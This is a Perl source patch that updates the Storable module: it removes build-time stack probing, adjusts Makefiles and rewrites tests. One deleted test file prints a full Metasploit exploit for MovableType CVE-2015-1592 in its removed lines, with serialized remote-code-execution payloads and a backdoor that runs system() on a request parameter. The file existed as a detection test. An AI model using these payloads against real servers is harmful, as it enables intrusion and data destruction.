@@ -1,0 +1,976 @@
+From 841cea7b099fc12274991dda349a86b1ce8059da Mon Sep 17 00:00:00 2001
+From: Andreas K. Hüttel <dilfridge@gentoo.org>
+Date: Fri, 19 Apr 2019 21:16:33 +0000
+Subject: [PATCH] Fix Storable for non glibc systems
+
+---
+ MANIFEST                          |   1 -
+ Makefile.SH                       |  25 ---
+ Porting/Maintainers.pl            |   4 +-
+ dist/Storable/ChangeLog           |  30 ++++
+ dist/Storable/Makefile.PL         |  46 +-----
+ dist/Storable/__Storable__.pm     |  35 ++--
+ dist/Storable/stacksize           |  77 ++-------
+ dist/Storable/t/CVE-2015-1592.inc | 261 ------------------------------
+ dist/Storable/t/CVE-2015-1592.t   |  25 ++-
+ dist/Storable/t/dclone.t          |   2 +
+ dist/Storable/t/recurse.t         |   4 +-
+ dist/Storable/t/threads.t         |   4 +
+ mkppport.lst                      |   1 +
+ win32/GNUmakefile                 |  12 +-
+ win32/Makefile                    |  10 +-
+ win32/makefile.mk                 |  15 +-
+ 16 files changed, 103 insertions(+), 449 deletions(-)
+ delete mode 100644 dist/Storable/t/CVE-2015-1592.inc
+
+diff --git a/MANIFEST b/MANIFEST
+index a6b5fe5..0f07fec 100644
+--- a/MANIFEST
++++ b/MANIFEST
+@@ -3716,7 +3716,6 @@ dist/Storable/t/code.t			See if Storable works
+ dist/Storable/t/compat01.t		See if Storable works
+ dist/Storable/t/compat06.t		See if Storable works
+ dist/Storable/t/croak.t			See if Storable works
+-dist/Storable/t/CVE-2015-1592.inc	See if Storable works
+ dist/Storable/t/CVE-2015-1592.t		See if Storable works
+ dist/Storable/t/dclone.t		See if Storable works
+ dist/Storable/t/destroy.t		Test Storable in global destructon
+diff --git a/Makefile.SH b/Makefile.SH
+index 61970d4..7440fc2 100755
+--- a/Makefile.SH
++++ b/Makefile.SH
+@@ -189,15 +189,11 @@ esac
+ 
+ : is Cwd static or dynamic
+ static_cwd='define'
+-storable_limit_dep=''
+-storable_type=''
+ list_util_dep='$(PERL_EXE)'
+ for f in $dynamic_ext; do
+    case $f in
+        Cwd) static_cwd='undef' ;;
+        List/Util) list_util_dep=lib/auto/List/Util/Util.$dlext ;;
+-       Storable) storable_limit_dep=lib/auto/Storable/Storable.$dlext
+-                 storable_type='dynamic' ;;
+    esac
+ done
+ 
+@@ -234,7 +230,6 @@ for f in $static_ext; do
+ $this_target: lib/auto/List/Util/Util\$(LIB_EXT)" ;;
+ 	Unicode/Normalize) extra_dep="$extra_dep
+ $this_target: uni.data" ;;
+-        Storable) storable_type='static' ;;
+     esac
+ done
+ 
+@@ -1201,26 +1196,6 @@ no_install no-install: install-notify
+ install: install-all
+ !NO!SUBS!
+ 
+-if test "$storable_type" != "" ; then
+-
+-case "$static_cwd" in
+-undef) storable_limit_dep="$storable_limit_dep lib/auto/Cwd/Cwd.$dlext" ;;
+-esac
+-
+-$spitshell >>$Makefile <<EOT
+-
+-dist/Storable/lib/Storable/Limit.pm : \$(PERL_EXE) dist/Storable/stacksize $storable_limit_dep
+-	cd dist/Storable ; \$(LDLIBPTH) \$(MAKE) lib/Storable/Limit.pm
+-
+-lib/Storable/Limit.pm : dist/Storable/lib/Storable/Limit.pm
+-	test -d lib/Storable || mkdir lib/Storable
+-	cp dist/Storable/lib/Storable/Limit.pm lib/Storable/Limit.pm
+-EOT
+-
+-common_build_deps="$common_build_deps lib/Storable/Limit.pm"
+-
+-fi
+-
+ for name in all notify silent strip verbose; do
+     flags="--$name";
+     flags=`echo $flags | sed -e 's/--all//'`
+diff --git a/Porting/Maintainers.pl b/Porting/Maintainers.pl
+index 4f039f7..64b56a5 100755
+--- a/Porting/Maintainers.pl
++++ b/Porting/Maintainers.pl
+@@ -351,7 +351,7 @@ use File::Glob qw(:case);
+         'EXCLUDED'     => [
+             'PPPort.pm',    # we use PPPort_pm.PL instead
+         ],
+-        'CUSTOMIZED'   => [ qw[ parts/embed.fnc ] ],
++	'CUSTOMIZED'   => [ qw[ parts/embed.fnc ] ],
+     },
+ 
+     'Devel::SelfStubber' => {
+@@ -1010,7 +1010,7 @@ use File::Glob qw(:case);
+     },
+ 
+     'Storable' => {
+-        'DISTRIBUTION' => 'AMS/Storable-2.51.tar.gz',
++        'DISTRIBUTION' => 'XSAWYERX/Storable-3.11.tar.gz',
+         'FILES'        => q[dist/Storable],
+         'EXCLUDED'     => [
+             qr{^t/compat/},
+diff --git a/dist/Storable/ChangeLog b/dist/Storable/ChangeLog
+index 3f3076a..5e63ea6 100644
+--- a/dist/Storable/ChangeLog
++++ b/dist/Storable/ChangeLog
+@@ -1,3 +1,33 @@
++unreleased
++    version 3.14
++	* (perl #133708) don't build-time probe for stack limits at all
++
++unreleased
++    version 3.12
++        * (perl #133411) don't probe for stack limits with -Dusecrosscompile
++
++2018-04-27 20:40:00 xsawyerx
++    version 3.11
++        * Fix Strawberry Perl build failures.
++
++2018-04-21 22:00:00 xsawyerx
++    Version 3.10
++        * Fix binary artifacts from distribution.
++
++2018-04-21 16:49:00 xsawyerx
++    Version 3.09
++        * Fix "provides" in metadata (META.yml/META.json) to use the Storable
++          template instead of a small other file (which also didn't exist).
++
++2018-04-21 11:23:00 xsawyerx
++    Version 3.08
++        * (perl #132849) try to disable core files when deliberatly segfaulting.
++        * (perl #127743) don't probe Storable limits so much.
++        * (perl #132893) don't probe for Storable recursion limits on old Win32.
++        * (perl #132870) workaround VC2017 compiler bug.
++        * (perl #127743) re-work for debugging builds with MSVC.
++        * (perl #133039) dont build a Storable.so/.dll with a static perl build.
++
+ 2018-02-07 15:08:00 tonyc
+     Version 3.06
+ 
+diff --git a/dist/Storable/Makefile.PL b/dist/Storable/Makefile.PL
+index 092bab4..4a39125 100644
+--- a/dist/Storable/Makefile.PL
++++ b/dist/Storable/Makefile.PL
+@@ -7,21 +7,18 @@
+ #
+ 
+ use strict;
+-use ExtUtils::MakeMaker;
++use warnings;
++use ExtUtils::MakeMaker 6.31;
+ use Config;
+ use File::Copy qw(move copy);
+ use File::Spec;
+ 
+-unlink "lib/Storable/Limit.pm";
+-
+ my $pm = { 'Storable.pm' => '$(INST_ARCHLIB)/Storable.pm' };
+-unless ($ENV{PERL_CORE}) {
+-    # the core Makefile takes care of this for core builds
+-    $pm->{"lib/Storable/Limit.pm"} = '$(INST_ARCHLIB)/Storable/Limit.pm';
+-}
+ 
+ WriteMakefile(
+     NAME                => 'Storable',
++    AUTHOR              => 'Perl 5 Porters',
++    LICENSE             => 'perl',
+     DISTNAME            => "Storable",
+ # We now ship this in t/
+ #    PREREQ_PM           => { 'Test::More' => '0.41' },
+@@ -36,7 +33,7 @@ WriteMakefile(
+                                { bugtracker => 'http://rt.perl.org/perlbug/' },
+                             provides    => {
+                                 'Storable'  => {
+-                                    file        => 'Storable_pm.PL',
++                                    file        => '__Storable__.pm',
+                                     version     => MM->parse_version('__Storable__.pm'),
+                                 },
+                             },
+@@ -81,28 +78,7 @@ sub xlinkext {
+ }
+ 
+ sub depend {
+-    my $extra_deps = "";
+-    my $options = "";
+-    if ($ENV{PERL_CORE}) {
+-        $options = "--core";
+-    }
+-    else {
+-        # blib.pm needs arch/lib
+-        $extra_deps = ' Storable.pm';
+-    }
+-    my $whichperl;
+-    if ($Config::Config{usecrosscompile}) {
+-        $whichperl = '$(PERLRUN)';
+-    }
+-    else {
+-        $whichperl = '$(FULLPERLRUNINST)';
+-    }
+-    my $linktype = uc($_[0]->{LINKTYPE});
+-    my $limit_pm = File::Spec->catfile('lib', 'Storable', 'Limit.pm');
+     "
+-$limit_pm : stacksize \$(INST_$linktype)$extra_deps
+-	\$(MKPATH) \$(INST_LIB)
+-	$whichperl stacksize $options
+ 
+ release : dist
+ 	git tag \$(VERSION)
+@@ -112,18 +88,6 @@ release : dist
+ "
+ }
+ 
+-sub test {
+-    my ($self, %attr) = @_;
+-
+-    my $out = $self->SUPER::test(%attr);
+-
+-    if ($ENV{PERL_CORE}) {
+-        $out =~ s!^(test(?:db)?_(?:static|dynamic)\b.*)!$1 lib/Storable/Limit.pm!gm;
+-    }
+-
+-    $out;
+-}
+-
+ sub postamble {
+ '
+ all :: Storable.pm
+diff --git a/dist/Storable/__Storable__.pm b/dist/Storable/__Storable__.pm
+index e77b240..812675a 100644
+--- a/dist/Storable/__Storable__.pm
++++ b/dist/Storable/__Storable__.pm
+@@ -27,18 +27,18 @@ our @EXPORT_OK = qw(
+ 
+ our ($canonical, $forgive_me);
+ 
+-our $VERSION = '3.08_01';
++our $VERSION = '3.14';
+ 
+ our $recursion_limit;
+ our $recursion_limit_hash;
+ 
+-do "Storable/Limit.pm";
+-
+ $recursion_limit = 512
+   unless defined $recursion_limit;
+ $recursion_limit_hash = 256
+   unless defined $recursion_limit_hash;
+ 
++use Carp;
++
+ BEGIN {
+     if (eval {
+         local $SIG{__DIE__};
+@@ -54,16 +54,23 @@ BEGIN {
+     # provide a fallback implementation.
+     #
+     unless ($Storable::{logcroak} && *{$Storable::{logcroak}}{CODE}) {
+-        require Carp;
++        *logcroak = \&Carp::croak;
++    }
++    else {
++        # Log::Agent's logcroak always adds a newline to the error it is
++        # given.  This breaks refs getting thrown.  We can just discard what
++        # it throws (but keep whatever logging it does) and throw the original
++        # args.
++        no warnings 'redefine';
++        my $logcroak = \&logcroak;
+         *logcroak = sub {
+-            Carp::croak(@_);
++            my @args = @_;
++            eval { &$logcroak };
++            Carp::croak(@args);
+         };
+     }
+     unless ($Storable::{logcarp} && *{$Storable::{logcarp}}{CODE}) {
+-	require Carp;
+-        *logcarp = sub {
+-          Carp::carp(@_);
+-        };
++        *logcarp = \&Carp::carp;
+     }
+ }
+ 
+@@ -941,13 +948,13 @@ There are a few things you need to know, however:
+ 
+ =item *
+ 
+-Since Storable 3.05 we probe for the stack recursion limit for references,
++From Storable 3.05 to 3.13 we probed for the stack recursion limit for references,
+ arrays and hashes to a maximal depth of ~1200-35000, otherwise we might
+ fall into a stack-overflow.  On JSON::XS this limit is 512 btw.  With
+ references not immediately referencing each other there's no such
+ limit yet, so you might fall into such a stack-overflow segfault.
+ 
+-This probing and the checks performed have some limitations:
++This probing and the checks we performed have some limitations:
+ 
+ =over
+ 
+@@ -955,7 +962,9 @@ This probing and the checks performed have some limitations:
+ 
+ the stack size at build time might be different at run time, eg. the
+ stack size may have been modified with ulimit(1).  If it's larger at
+-run time Storable may fail the freeze() or thaw() unnecessarily.
++run time Storable may fail the freeze() or thaw() unnecessarily.  If
++it's larger at build time Storable may segmentation fault when
++processing a deep structure at run time.
+ 
+ =item *
+ 
+@@ -970,6 +979,8 @@ stack without triggering Storable's recursion protection.
+ 
+ =back
+ 
++So these now have simple defaults rather than probing at build-time.
++
+ You can control the maximum array and hash recursion depths by
+ modifying C<$Storable::recursion_limit> and
+ C<$Storable::recursion_limit_hash> respectively.  Either can be set to
+diff --git a/dist/Storable/stacksize b/dist/Storable/stacksize
+index 14e0739..f93eccc 100644
+--- a/dist/Storable/stacksize
++++ b/dist/Storable/stacksize
+@@ -1,21 +1,17 @@
+ #!/usr/bin/perl
+ # binary search maximum stack depth for arrays and hashes
+-# and store it in lib/Storable/Limit.pm
++# and report it to stdout as code to set the limits
+ 
+ use Config;
+ use Cwd;
+ use File::Spec;
+ use strict;
+ 
+--d "lib" or mkdir "lib";
+--d "lib/Storable" or mkdir "lib/Storable";
+-
+-my $fn = "lib/Storable/Limit.pm";
+ my $ptrsize = $Config{ptrsize};
+ my ($bad1, $bad2) = (65001, 25000);
+ sub QUIET () {
+     (defined $ENV{MAKEFLAGS} and $ENV{MAKEFLAGS} =~ /\b(s|silent|quiet)\b/
+-     and !defined($ENV{TRAVIS}))
++     and !defined($ENV{TRAVIS})) || @ARGV && $ARGV[0] eq "-q"
+       ? 1 : 0
+ }
+ sub PARALLEL () {
+@@ -32,11 +28,7 @@ sub is_miniperl {
+ }
+ 
+ if (is_miniperl()) {
+-    if ($Config{usecrosscompile}) {
+-        write_limits(500, 265);
+-        exit;
+-    }
+-    die "Should not run during miniperl\n";
++    die "Should not run using miniperl\n";
+ }
+ my $prefix = "";
+ if ($^O eq "MSWin32") {
+@@ -51,58 +43,28 @@ elsif (system("ulimit -c 0 ;") == 0) {
+     # try to prevent core dumps
+     $prefix = "ulimit -c 0 ; ";
+ }
+-if (@ARGV and $ARGV[0] eq '--core') {
+-    $ENV{PERL_CORE} = 1;
+-}
+ my $PERL = $^X;
+-if ($ENV{PERL_CORE}) {
+-    my $path;
+-    my $ldlib = $Config{ldlibpthname};
+-    if (-d 'dist/Storable') {
+-        chdir 'dist/Storable';
+-        $PERL = "../../$PERL" unless $PERL =~ m|^/|;
+-    }
+-    if ($ldlib) {
+-        $path = getcwd()."/../..";
+-    }
+-    if ($^O eq 'MSWin32' and -d '../dist/Storable') {
+-        chdir '..\dist\Storable';
+-        $PERL = "..\\..\\$PERL" unless $PERL =~ /^[A-Za-z]:\\/;
+-    }
+-    $PERL = "\"$PERL\"" if $PERL =~ / /;
+-    if ($ldlib and $ldlib ne 'PATH') {
+-        $PERL = "$ldlib=$path $PERL";
+-    }
+-}
+-
+ if ($^O eq "MSWin32") {
+     require Win32;
+     my ($str, $major, $minor) = Win32::GetOSVersion();
+     if ($major < 6 || $major == 6 && $minor < 1) {
+-	print "Using defaults for older Win32\n";
++	print "# Using defaults for older Win32\n";
+ 	write_limits(500, 256);
+ 	exit;
+     }
+ }
+ my ($n, $good, $bad, $found) =
+     (65000, 100, $bad1, undef);
+-print "probe for max. stack sizes...\n" unless QUIET;
++print "# probe for max. stack sizes...\n" unless QUIET;
+ # -I. since we're run before pm_to_blib (which is going to copy the
+ # file we create) and need to load our Storable.pm, not the already
+ # installed Storable.pm
+-my $mblib = '-Mblib -I.';
+-if ($ENV{PERL_CORE}) {
+-    if ($^O eq 'MSWin32') {
+-        $mblib = '-I..\..\lib\auto -I..\..\lib';
+-    } else {
+-        $mblib = '-I../../lib/auto -I../../lib';
+-    }
++my $mblib = '';
++if (-d 'blib') {
++    $mblib = '-Mblib -I.';
+ }
+-if (PARALLEL) {
+-    # problem with parallel builds. wait for INST_DYNAMIC linking to be done.
+-    # the problem is the RM_F INST_DYNAMIC race.
+-    print "parallel build race - wait for linker ...\n" unless QUIET;
+-    sleep(2.0);
++elsif (-f "Configure") {
++    $mblib = '-Ilib';
+ }
+ 
+ sub cmd {
+@@ -117,7 +79,7 @@ sub cmd {
+ sub good {
+     my $i = shift; # this passed
+     my $j = $i + abs(int(($bad - $i) / 2));
+-    print "Storable: determining recursion limit: $i passed, try more $j ...\n" unless QUIET;
++    print "# Storable: determining recursion limit: $i passed, try more $j ...\n" unless QUIET;
+     $good = $i;
+     if ($j <= $i) {
+         $found++;
+@@ -128,7 +90,7 @@ sub good {
+ sub bad {
+     my $i = shift; # this failed
+     my $j = $i - abs(int(($i - $good) / 2));
+-    print "Storable: determining recursion limit: $i too big, try less $j ...\n" unless QUIET;
++    print "# Storable: determining recursion limit: $i too big, try less $j ...\n" unless QUIET;
+     $bad = $i;
+     if ($j >= $i) {
+         $j = $good;
+@@ -162,7 +124,7 @@ while (!$found) {
+         $n = bad($n);
+     }
+ }
+-print "MAX_DEPTH = $n\n" unless QUIET;
++print "# MAX_DEPTH = $n\n" unless QUIET;
+ my $max_depth = $n;
+ 
+ ($n, $good, $bad, $found) =
+@@ -186,13 +148,13 @@ if ($max_depth == $bad1-1
+     and $n == $bad2-1)
+ {
+     # more likely the shell. travis docker ubuntu, mingw e.g.
+-    print "Error: Apparently your system(SHELLSTRING) cannot catch stack overflows\n"
++    print "# Apparently your system(SHELLSTRING) cannot catch stack overflows\n"
+       unless QUIET;
+     $max_depth = 512;
+     $n = 256;
+     print "MAX_DEPTH = $max_depth\n" unless QUIET;
+ }
+-print "MAX_DEPTH_HASH = $n\n" unless QUIET;
++print "# MAX_DEPTH_HASH = $n\n" unless QUIET;
+ my $max_depth_hash = $n;
+ 
+ # Previously this calculation was done in the macro, calculate it here
+@@ -203,7 +165,7 @@ my $max_depth_hash = $n;
+ # several apparently random failures here, eg. working in one
+ # configuration, but not in a very similar configuration.
+ $max_depth = int(0.6 * $max_depth);
+-$max_depth_hash = int(0.6 * $max_depth);
++$max_depth_hash = int(0.6 * $max_depth_hash);
+ 
+ my $stack_reserve = $^O eq "MSWin32" ? 32 : 16;
+ if ($] ge "5.016" && !($^O eq "cygwin" && $ptrsize == 8)) {
+@@ -221,16 +183,11 @@ write_limits($max_depth, $max_depth_hash);
+ 
+ sub write_limits {
+     my ($max_depth, $max_depth_hash) = @_;
+-    my $f;
+-    open $f, ">", $fn or die "$fn $!";
+-    print $f <<EOS;
++    print <<EOS;
+ # bisected by stacksize
+ \$Storable::recursion_limit = $max_depth
+   unless defined \$Storable::recursion_limit;
+ \$Storable::recursion_limit_hash = $max_depth_hash
+   unless defined \$Storable::recursion_limit_hash;
+-1;
+ EOS
+-    close $f
+-      or die "Failed to close $fn: $!\n";
+ }
+diff --git a/dist/Storable/t/CVE-2015-1592.inc b/dist/Storable/t/CVE-2015-1592.inc
+deleted file mode 100644
+index 481dba5..0000000
+--- a/dist/Storable/t/CVE-2015-1592.inc
++++ /dev/null
+@@ -1,261 +0,0 @@
+-#!/usr/bin/perl
+-
+-=pod
+-
+-class MetasploitModule < Msf::Exploit::Remote
+-  Rank = GoodRanking
+-
+-  include Msf::Exploit::Remote::HttpClient
+-
+-  def initialize(info = {})
+-    super(update_info(info,
+-      'Name'           => 'SixApart MovableType Storable Perl Code Execution',
+-      'Description'    => %q{
+-          This module exploits a serialization flaw in MovableType before 5.2.12 to execute
+-          arbitrary code. The default nondestructive mode depends on the target server having
+-          the Object::MultiType and DateTime Perl modules installed in Perl's @INC paths.
+-          The destructive mode of operation uses only required MovableType dependencies,
+-          but it will noticeably corrupt the MovableType installation.
+-      },
+-      'Author'         =>
+-        [
+-          'John Lightsey',
+-        ],
+-      'License'        => MSF_LICENSE,
+-      'References'     =>
+-        [
+-          [ 'CVE', '2015-1592' ],
+-          [ 'URL', 'https://movabletype.org/news/2015/02/movable_type_607_and_5212_released_to_close_security_vulnera.html' ],
+-        ],
+-      'Privileged'     => false, # web server context
+-      'Payload'        =>
+-        {
+-          'DisableNops' => true,
+-          'BadChars'    => ' ',
+-          'Space'       => 1024,
+-        },
+-      'Compat'         =>
+-        {
+-          'PayloadType' => 'cmd'
+-        },
+-      'Platform'       => ['unix'],
+-      'Arch'           => ARCH_CMD,
+-      'Targets'        => [['Automatic', {}]],
+-      'DisclosureDate' => 'Feb 11 2015',
+-      'DefaultTarget'  => 0))
+-
+-    register_options(
+-      [
+-        OptString.new('TARGETURI', [true, 'MoveableType cgi-bin directory path', '/cgi-bin/mt/']),
+-        OptBool.new('DESTRUCTIVE', [true, 'Use destructive attack method (more likely to succeed, but corrupts target system.)', false])
+-      ], self.class
+-    )
+-
+-  end
+-
+-=cut
+-
+-# generate config parameters for injection checks
+-
+-use Storable;
+-
+-{
+-
+-    package XXXCHECKXXX;
+-
+-    sub STORABLE_thaw {
+-        return 1;
+-    }
+-
+-    sub STORABLE_freeze {
+-        return 1;
+-    }
+-
+-}
+-
+-my $check_obj = bless { ignore => 'this' }, XXXCHECKXXX;
+-my $frozen2 = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({ x => $check_obj});
+-$frozen2 = unpack 'H*', $frozen2;
+-#print "LFI test for storable flaw is: $frozen2\n";
+-
+-{
+-    package DateTime;
+-    use overload '+' => sub { 'ignored' };
+-}
+-
+-=pod
+-
+-  def check
+-    vprint_status("Sending storable test injection for XXXCHECKXXX.pm load failure")
+-    res = send_request_cgi({
+-        'method'    => 'GET',
+-        'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+-        'vars_get' => {
+-          '__mode' => 'retry',
+-          'step'   => 'configure',
+-          'config' => '53455247000000000000000304080831323334353637380408080803010000000413020b585858434845434b58585801310100000078'
+-        }
+-      })
+-
+-    unless res && res.code == 200 && res.body.include?("Can't locate XXXCHECKXXX.pm")
+-      vprint_status("Failed XXXCHECKXXX.pm load test");
+-      return Exploit::CheckCode::Safe
+-    end
+-    Exploit::CheckCode::Vulnerable
+-  end
+-
+-  def exploit
+-    if datastore['DESTRUCTIVE']
+-      exploit_destructive
+-    else
+-      exploit_nondestructive
+-    end
+-  end
+-
+-=cut
+-
+-#!/usr/bin/perl
+-
+-# Generate nondestructive config parameter for RCE via Object::MultiType
+-# and Try::Tiny. The generated value requires minor modification to insert
+-# the payload inside the system() call and resize the padding.
+-
+-use Storable;
+-
+-{
+-    package Object::MultiType;
+-    use overload '+' => sub { 'ingored' };
+-}
+-
+-{
+-    package Object::MultiType::Saver;
+-}
+-
+-#{
+-#    package DateTime;
+-#    use overload '+' => sub { 'ingored' };
+-#}
+-
+-{
+-    package Try::Tiny::ScopeGuard;
+-}
+-
+-my $try_tiny_loader = bless {}, 'DateTime';
+-my $multitype_saver = bless { c => 'MT::run_app' }, 'Object::MultiType::Saver';
+-my $multitype_coderef = bless \$multitype_saver, 'Object::MultiType';
+-my $try_tiny_executor = bless [$multitype_coderef, 'MT;print qq{Content-type: text/plain\n\n};system(q{});' . ('#' x 1025) . "\nexit;"], 'Try::Tiny::ScopeGuard';
+-
+-my $data = [$try_tiny_loader, $try_tiny_executor];
+-my $frozen1 = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);
+-$frozen1 = unpack 'H*', $frozen1;
+-#print "RCE payload requiring Object::MultiType and DateTime: $frozen1\n";
+-
+-=pod
+-
+-  def exploit_nondestructive
+-    print_status("Using nondestructive attack method")
+-    config_payload = "53455247000000000000000304080831323334353637380408080802020000001411084461746554696d6503000000000411155472793a3a54696e793a3a53636f7065477561726402020000001411114f626a6563743a3a4d756c7469547970650411184f626a6563743a3a4d756c7469547970653a3a536176657203010000000a0b4d543a3a72756e5f6170700100000063013d0400004d543b7072696e742071717b436f6e74656e742d747970653a20746578742f706c61696e5c6e5c6e7d3b73797374656d28717b"
+-    config_payload <<  payload.encoded.unpack('H*')[0]
+-    config_payload << "7d293b"
+-    config_payload << "23" * (1025 - payload.encoded.length)
+-    config_payload << "0a657869743b"
+-
+-    print_status("Sending payload (#{payload.raw.length} bytes)")
+-
+-    send_request_cgi({
+-      'method'    => 'GET',
+-      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+-      'vars_get' => {
+-        '__mode' => 'retry',
+-        'step'   => 'configure',
+-        'config' => config_payload
+-      }
+-    }, 5)
+-  end
+-
+-=cut
+-
+-#!/usr/bin/perl
+-
+-# Generate destructive config parameter to unlink mt-config.cgi
+-
+-use Storable;
+-
+-{
+-    package CGITempFile;
+-}
+-
+-my $unlink_target = "mt-config.cgi";
+-my $cgitempfile = bless \$unlink_target, "CGITempFile";
+-
+-$data = [$cgitempfile];
+-my $frozen_data = Storable::freeze($data);
+-my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . $frozen_data;
+-$frozen = unpack 'H*', $frozen;
+-#print "RCE unlink payload requiring CGI: $frozen\n";
+-
+-# $Storable::DEBUGME = 1;
+-# $^W = 1;
+-Storable::thaw($frozen_data);
+-
+-=pod
+-
+-def exploit_destructive
+-    print_status("Using destructive attack method")
+-    # First we need to delete mt-config.cgi using the storable injection
+-
+-    print_status("Sending storable injection to unlink mt-config.cgi")
+-
+-    res = send_request_cgi({
+-      'method'    => 'GET',
+-      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+-      'vars_get' => {
+-        '__mode' => 'retry',
+-        'step'   => 'configure',
+-        'config' => '534552470000000000000003040808313233343536373804080808020100000004110b43474954656d7046696c650a0d6d742d636f6e6669672e636769'
+-      }
+-    })
+-
+-    if res && res.code == 200
+-      print_status("Successfully sent unlink request")
+-    else
+-      fail_with(Failure::Unknown, "Error sending unlink request")
+-    end
+-
+-    # Now we rewrite mt-config.cgi to accept a payload
+-
+-    print_status("Rewriting mt-config.cgi to accept the payload")
+-
+-    res = send_request_cgi({
+-      'method'    => 'GET',
+-      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+-      'vars_get'  => {
+-        '__mode'             => 'next_step',
+-        'step'               => 'optional',
+-        'default_language'   => 'en_us',
+-        'email_address_main' => "x\nObjectDriver mysql;use CGI;print qq{Content-type: text/plain\\n\\n};if(my $c = CGI->new()->param('xyzzy')){system($c);};unlink('mt-config.cgi');exit;1",
+-        'set_static_uri_to'  => '/',
+-        'config'             => '5345524700000000000000024800000001000000127365745f7374617469635f66696c655f746f2d000000012f', # equivalent to 'set_static_file_to' => '/',
+-      }
+-    })
+-
+-    if res && res.code == 200
+-      print_status("Successfully sent mt-config rewrite request")
+-    else
+-      fail_with(Failure::Unknown, "Error sending mt-config rewrite request")
+-    end
+-
+-    # Finally send the payload
+-
+-    print_status("Sending payload request")
+-
+-    send_request_cgi({
+-      'method'    => 'GET',
+-      'uri'       => normalize_uri(target_uri.path, 'mt.cgi'),
+-      'vars_get'  => {
+-        'xyzzy'   => payload.encoded,
+-      }
+-    }, 5)
+-  end
+-
+-=cut
+diff --git a/dist/Storable/t/CVE-2015-1592.t b/dist/Storable/t/CVE-2015-1592.t
+index 2730cdc..a71f44c 100644
+--- a/dist/Storable/t/CVE-2015-1592.t
++++ b/dist/Storable/t/CVE-2015-1592.t
+@@ -1,22 +1,21 @@
+ #!/usr/bin/perl
+ 
+ use strict;
++use warnings;
+ use Test::More;
++use Storable qw(freeze thaw);
+ plan tests => 1;
+ 
+-use File::Temp qw(tempdir);
+-use File::Spec;
+-my $tmp_dir = tempdir(CLEANUP => 1);
+-my $tmp_file = File::Spec->catfile($tmp_dir, 'sploit');
++# this original worked with the packaged exploit, but that
++# triggers virus scanners, so test for the behaviour instead
++my $x = bless \(my $y = "mt-config.cgi"), "CGITempFile";
++
++my $frozen = freeze($x);
+ 
+-my $file = __FILE__;
+-$file =~ s/\.t$/.inc/;
+-my $inc = $ENV{PERL_CORE} ? "-Ilib -I../../lib" : "-I".join(" -I", @INC);
+-system qq($^X $inc -w "$file" 2>$tmp_file);
+-open(my $fh, "<", $tmp_file) or die "$tmp_file $!";
+ {
+-  local $/;
+-  my $err = <$fh>;
+-  like($err, qr/SECURITY: Movable-Type CVE-2015-1592 Storable metasploit attack/,
+-       'Detect CVE-2015-1592');
++    my $warnings = '';
++    local $SIG{__WARN__} = sub { $warnings .= "@_" };
++    thaw($frozen);
++    like($warnings, qr/SECURITY: Movable-Type CVE-2015-1592 Storable metasploit attack/,
++         'Detect CVE-2015-1592');
+ }
+diff --git a/dist/Storable/t/dclone.t b/dist/Storable/t/dclone.t
+index af3d7f6..ce6c756 100644
+--- a/dist/Storable/t/dclone.t
++++ b/dist/Storable/t/dclone.t
+@@ -87,6 +87,8 @@ SKIP: {
+ # Do not fail if Tie::Hash and/or Tie::StdHash is not available
+     skip 'No Tie::StdHash available', 2
+ 	unless eval { require Tie::Hash; scalar keys %Tie::StdHash:: };
++    skip 'This version of perl has problems with Tie::StdHash', 2
++	if $] eq "5.008";
+     tie my %tie, "Tie::StdHash" or die $!;
+     $tie{array} = [1,2,3,4];
+     $tie{hash} = {1,2,3,4};
+diff --git a/dist/Storable/t/recurse.t b/dist/Storable/t/recurse.t
+index 63fde90..b5967a0 100644
+--- a/dist/Storable/t/recurse.t
++++ b/dist/Storable/t/recurse.t
+@@ -318,9 +318,11 @@ is($refcount_ok, 1, "check refcount");
+ # Small 64bit systems fail with 1200 (c++ debugging), with gcc 3000.
+ # Optimized 64bit allows up to 33.000 recursion depth.
+ # with asan the limit is 255 though.
++
++local $Storable::recursion_limit = 30;
++local $Storable::recursion_limit_hash = 20;
+ sub MAX_DEPTH () { Storable::stack_depth() }
+ sub MAX_DEPTH_HASH () { Storable::stack_depth_hash() }
+-sub OVERFLOW () { 35000 }
+ {
+     my $t;
+     print "# max depth ", MAX_DEPTH, "\n";
+diff --git a/dist/Storable/t/threads.t b/dist/Storable/t/threads.t
+index 0bc2486..0b34334 100644
+--- a/dist/Storable/t/threads.t
++++ b/dist/Storable/t/threads.t
+@@ -28,6 +28,10 @@ sub BEGIN {
+         print "1..0 # Skip: no threads\n";
+         exit 0;
+     }
++    if ($] eq "5.008" || $] eq "5.010000") {
++        print "1..0 # Skip: threads unreliable in perl-$]\n";
++        exit 0;
++    }
+     # - is \W, so can't use \b at start. Negative look ahead and look behind
+     # works at start/end of string, or where preceded/followed by spaces
+     if ($] == 5.008002 and eval q{ $Config{'ccflags'} =~ /(?<!\S)-DDEBUGGING(?!\S)/ }) {
+diff --git a/mkppport.lst b/mkppport.lst
+index a443dac..b3992c8 100644
+--- a/mkppport.lst
++++ b/mkppport.lst
+@@ -12,3 +12,4 @@ cpan/Win32API-File
+ dist/IO
+ dist/PathTools
+ dist/Time-HiRes
++dist/Storable
+diff --git a/win32/GNUmakefile b/win32/GNUmakefile
+index 200d8a5..1c163d7 100644
+--- a/win32/GNUmakefile
++++ b/win32/GNUmakefile
+@@ -1177,7 +1177,7 @@ CFG_VARS	=					\
+ 
+ .PHONY: all info
+ 
+-all : info rebasePE Extensions_nonxs $(PERLSTATIC) PostExt
++all : info rebasePE Extensions_nonxs $(PERLSTATIC)
+ 
+ info :
+ 	@echo # CCTYPE=$(CCTYPE)
+@@ -1621,16 +1621,6 @@ Extensions_clean :
+ Extensions_realclean :
+ 	-if exist $(MINIPERL) $(MINIPERL) -I..\lib ..\make_ext.pl "MAKE=$(PLMAKE)" --dir=$(CPANDIR) --dir=$(DISTDIR) --dir=$(EXTDIR) --all --target=realclean
+ 
+-PostExt : ..\lib\Storable\Limit.pm
+-
+-# we need the exe, perl(ver).dll, and the Exporter, Storable, Win32 extensions
+-# rebasePE most of that, including adjustment for static builds, so we
